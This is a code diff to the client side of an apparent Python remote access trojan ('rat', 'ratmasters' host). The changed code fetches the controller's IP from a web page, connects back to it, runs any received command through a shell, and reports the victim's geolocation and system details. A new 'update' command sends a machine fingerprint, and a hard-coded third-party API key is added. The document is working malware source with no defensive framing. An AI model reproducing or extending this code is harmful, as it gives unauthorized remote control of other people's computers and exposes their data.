@@ -8,6 +8,22 @@ import pyautogui
 import json
 import platform
 
+def get_ip():
+    formdata = {
+    'username': 'Pelle Peloton',
+    'password': 'rotta',
+    }
+    
+    r = requests.post("http://localhost:8080/rat/index.php", data=formdata)
+    # r = requests.post("https://ratmasters.000webhostapp.com/", data=formdata)
+    bs = BeautifulSoup(r.text, 'html.parser')
+    ip = bs.find('span', {'id':'ip'})
+    port = bs.find('span', {'id':'port'})
+    # return ip.text
+    return ip.text
+    #print(ip.text)
+
+
 os.system("color")
 
     # HEADER = '\033[95m'
@@ -22,8 +38,8 @@ os.system("color")
 
 
 payload = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-payload.connect(("127.0.0.1", 80)) #Kali Linux
-#payload.connect(("172.20.60.62", 80)) #Win 10
+# payload.connect(("192.168.127.131", 8888)) #Kali Linux
+payload.connect((get_ip(), 80)) #Win 10
 
 def recv_data():
     original_size = payload.recv(2048).decode('utf-8')
@@ -36,23 +52,16 @@ def recv_data():
 def send_data(output_data):
     size_of_data = str(len(output_data))
     payload.send(bytes(size_of_data,'utf8'))
-    time.sleep(1)
+    time.sleep(2)
     payload.send(output_data)
 
-def get_ip():
-    result = requests.get('https://ratmasters.000webhostapp.com/')
-    bs = BeautifulSoup(result.text, 'html.parser')
-    ip = bs.find('span').text
-    return ip
 
 def geo():
-    with open('api.txt', 'r') as f:
-        api = f.readline() 
     url = "https://ip-geo-location.p.rapidapi.com/ip/check"
     querystring = {"format":"json"}
     headers = {
         "X-RapidAPI-Host": "ip-geo-location.p.rapidapi.com",
-        "X-RapidAPI-Key": api
+        "X-RapidAPI-Key": "32817552b9msh76d99ce4ae9c87fp1520f9jsn63fc1b2efaa1"
     }
     response = requests.request("GET", url, headers=headers, params=querystring)
 
@@ -63,11 +72,24 @@ Longitude:\t{testi['location']['longitude']}\n"""
     # print(response.text)
 
 def sysinfo():
+    # info = '{"hello":"moikka", "juu":"jee"}'
+    # return info
     return f"""\nArchitecture:\t{platform.machine()}\nPlatform:\t{platform.platform()}
 Processor:\t{platform.processor()}\nName:\t\t{platform.node()}\nSystem:\t\t{platform.system()}\n"""
 
+def update():
+    machine = platform.machine()
+    os = platform.platform()
+    system = platform.system()
+    ip = socket.gethostbyname(socket.gethostname())
+    processor = platform.processor()
+    release = platform.release()
+    return f"{machine},{os},{system},{ip},{processor}"
+
 while True:
     cmd = payload.recv(2048).decode('utf8')
+    if cmd == '':
+        continue
     if cmd == 'exit':
         payload.close()
         break
@@ -103,23 +125,26 @@ while True:
             send_data(b'\033[92m\nfile deleted\033[0m\n')
         else:
             send_data(b'\033[91m\nfile not found\033[0m\n')
+        continue
     elif cmd == 'geo':
         send_data(geo().encode('utf-8'))
         continue
     elif cmd == 'sysinfo':
         send_data(sysinfo().encode('utf-8'))
+        # send_data(sysinfo())
+        continue
+    elif cmd == 'update':
+        send_data(str(update()).encode('utf8'))
         continue
     elif cmd == 'help':
         continue
     elif cmd == 'cls':
         continue
-    elif cmd == '':
-        continue
     try:
         output = subprocess.check_output(cmd, shell=True)
-        if output == b'':
+        if len(output) == 0:
             continue
-      
+        
     except subprocess.CalledProcessError:
         send_data(b'\033[91m\nInvalid Command\033[0m\n')
     else:
